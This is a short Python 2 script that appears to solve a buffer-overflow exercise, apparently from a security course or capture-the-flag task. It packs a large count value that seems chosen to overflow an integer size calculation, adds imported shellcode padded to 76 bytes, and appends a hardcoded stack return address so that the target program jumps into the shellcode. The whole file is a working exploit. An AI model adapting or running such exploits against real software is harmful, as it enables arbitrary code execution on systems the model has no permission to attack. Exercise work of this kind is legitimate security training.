from struct import pack
from shellcode import shellcode

count = 0x40000001
retadd = 0xbffea0a0
s = shellcode + "A" * (76 - len(shellcode))
print str(pack("<I", count)) + s + str(pack("<I", retadd))